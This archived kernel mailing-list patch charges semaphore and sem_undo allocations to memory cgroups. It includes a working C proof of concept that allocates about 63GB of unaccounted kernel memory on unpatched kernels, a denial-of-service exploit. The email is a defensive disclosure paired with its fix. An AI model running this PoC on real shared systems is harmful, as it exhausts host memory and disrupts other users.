Return-Path: <cgroups-owner@vger.kernel.org>
X-Original-To: lists+cgroups@lfdr.de
Delivered-To: lists+cgroups@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 46C053C9976
	for <lists+cgroups@lfdr.de>; Thu, 15 Jul 2021 09:14:57 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S236350AbhGOHRs (ORCPT <rfc822;lists+cgroups@lfdr.de>);
        Thu, 15 Jul 2021 03:17:48 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:38230 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S230410AbhGOHRs (ORCPT
        <rfc822;cgroups@vger.kernel.org>); Thu, 15 Jul 2021 03:17:48 -0400
Received: from mail-pg1-x534.google.com (mail-pg1-x534.google.com [IPv6:2607:f8b0:4864:20::534])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 172F0C06175F
        for <cgroups@vger.kernel.org>; Thu, 15 Jul 2021 00:14:56 -0700 (PDT)
Received: by mail-pg1-x534.google.com with SMTP id h4so5093573pgp.5
        for <cgroups@vger.kernel.org>; Thu, 15 Jul 2021 00:14:56 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=from:to:cc:subject:date:message-id;
        bh=mRV8T0Y7cNn0dZ1dErTOtwAnuaw6Z0Qy+uCvTtEyaTo=;
        b=vFtzqUBvmddAmZZqsG14TK4QWHXiT5KHj9HFC8vgyb5hrS2/dp1iWg8Xn9XR1PVMje
         RIbuEwx43xdyXeI3tmOlilqZnDIMbgOibBHvyTaSmaYLNFfz2oMkQob1ZXlRZZgYAiHs
         LAWwumRlpNxmON9Cq1aD18fpN9qTntofk5f4ADQCynWnEUntwteGhIwMTNjFhLb2B2Pp
         RrRlj7VYqj1N5iCTLftMz9i9xbHl3a97tsOyOvXouaXjECHyX8oaT2ZY3RwNha4UXRXn
         DZRDhgqamNZ6gJTGd1MdLTgr+mK1B1IgPwiOyw+z8nyzSw8v+r/TPT9r8sR0xVgUuY+n
         gGCg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:from:to:cc:subject:date:message-id;
        bh=mRV8T0Y7cNn0dZ1dErTOtwAnuaw6Z0Qy+uCvTtEyaTo=;
        b=pXWjkVxCXgzknpvZYhj9pP/21wRGQk+7PtZ5vYY2zpf4GTf+VcokXydzZKvRpfhN48
         qIr4R6pFxjoe7IF+xIqu9eprErMWPiystMbavzBUOIPTkZAobZW9ISB3AnptsUoXoUXt
         rbEJSdFvFgnBMva5RNy0x/pMMxjyhCdumDz4hU4iz3MK+Sl7zb02AH9WRnTd9sBWGPVx
         WsGT8NSK/o7TOlibwfGW6aDqSzGHdCdaVDYv8gAN6r7NFDcWpArj2M1x8/lIXdJBgXBw
         cYghaeDwelGVOZz4x/q8h2yhwp4XNtvU1Qzu85fzs8R2J/hev4LoQEcIoO8pP0LDVyTS
         csig==
X-Gm-Message-State: AOAM532O9Bbl60n/mDYZJ5AgPF9G+Rv6khln61A36qNWj2SfBM0dE5qI
        ErvMiw9q5iGk9l8J8RG8DvnzZ2ItlGeHCAPajLY=
X-Google-Smtp-Source: ABdhPJz818Bcq5pfeU3/6FZn1KLD0IfUeAgA8NMe1CCFxf4XMCMK1xoX8WZMVpDI7FABGnk6AvlfXQ==
X-Received: by 2002:a63:e0c:: with SMTP id d12mr1311771pgl.386.1626333295725;
        Thu, 15 Jul 2021 00:14:55 -0700 (PDT)
Received: from honest-machine-1.localdomain.localdomain (80.251.213.191.16clouds.com. [80.251.213.191])
        by smtp.gmail.com with ESMTPSA id o25sm5912494pgd.21.2021.07.15.00.14.54
        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
        Thu, 15 Jul 2021 00:14:55 -0700 (PDT)
From:   Yutian Yang <nglaive@gmail.com>
To:     mhocko@kernel.org, hannes@cmpxchg.org, vdavydov.dev@gmail.com
Cc:     cgroups@vger.kernel.org, linux-mm@kvack.org, shenwenbo@zju.edu.cn,
        Yutian Yang <nglaive@gmail.com>
Subject: [PATCH] memcg: charge semaphores and sem_undo objects
Date:   Thu, 15 Jul 2021 03:14:44 -0400
Message-Id: <1626333284-1404-1-git-send-email-nglaive@gmail.com>
X-Mailer: git-send-email 1.8.3.1
Precedence: bulk
List-ID: <cgroups.vger.kernel.org>
X-Mailing-List: cgroups@vger.kernel.org

This patch adds accounting flags to semaphores and sem_undo allocation
sites so that kernel could correctly charge these objects. 

A malicious user could take up more than 63GB unaccounted memory under 
default sysctl settings by exploiting the unaccounted objects. She could 
allocate up to 32,000 unaccounted semaphore sets with up to 32,000 
unaccounted semaphore objects in each set. She could further allocate one 
sem_undo unaccounted object for each semaphore set.

The following code shows a PoC that takes ~63GB unaccounted memory, while 
it is charged for only less than 1MB memory usage. We evaluate the PoC on 
QEMU x86_64 v5.2.90 + Linux kernel v5.10.19 + Debian buster. 

/*------------------------- POC code ----------------------------*/
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <time.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sched.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

int main(int argc, char *argv[]) {
  int err, semid;
  struct sembuf sops;
  for (int i = 0; i < 31200; ++i) {
    semid = semget(IPC_PRIVATE, 31200, IPC_CREAT);
    if (semid == -1) {
      errExit("semget");
    }
    sops.sem_num = 0;
    sops.sem_op = 1;
    sops.sem_flg = SEM_UNDO;
    err = semop(semid, &sops, 1);
    if (err == -1) {
      errExit("semop");
    }
  }
  while(1);
  return 0;
}
/*-------------------------- end --------------------------------*/

Thanks!

Yutian Yang,
Zhejiang University

Signed-off-by: Yutian Yang <nglaive@gmail.com>
---
 ipc/sem.c | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

diff --git a/ipc/sem.c b/ipc/sem.c
index f6c30a85d..6860de0b1 100644
--- a/ipc/sem.c
+++ b/ipc/sem.c
@@ -511,7 +511,7 @@ static struct sem_array *sem_alloc(size_t nsems)
 	if (nsems > (INT_MAX - sizeof(*sma)) / sizeof(sma->sems[0]))
 		return NULL;
 
-	sma = kvzalloc(struct_size(sma, sems, nsems), GFP_KERNEL);
+	sma = kvzalloc(struct_size(sma, sems, nsems), GFP_KERNEL_ACCOUNT);
 	if (unlikely(!sma))
 		return NULL;
 
@@ -1935,7 +1935,7 @@ static struct sem_undo *find_alloc_undo(struct ipc_namespace *ns, int semid)
 	rcu_read_unlock();
 
 	/* step 2: allocate new undo structure */
-	new = kzalloc(sizeof(struct sem_undo) + sizeof(short)*nsems, GFP_KERNEL);
+	new = kzalloc(sizeof(struct sem_undo) + sizeof(short)*nsems, GFP_KERNEL_ACCOUNT);
 	if (!new) {
 		ipc_rcu_putref(&sma->sem_perm, sem_rcu_free);
 		return ERR_PTR(-ENOMEM);
-- 
2.25.1

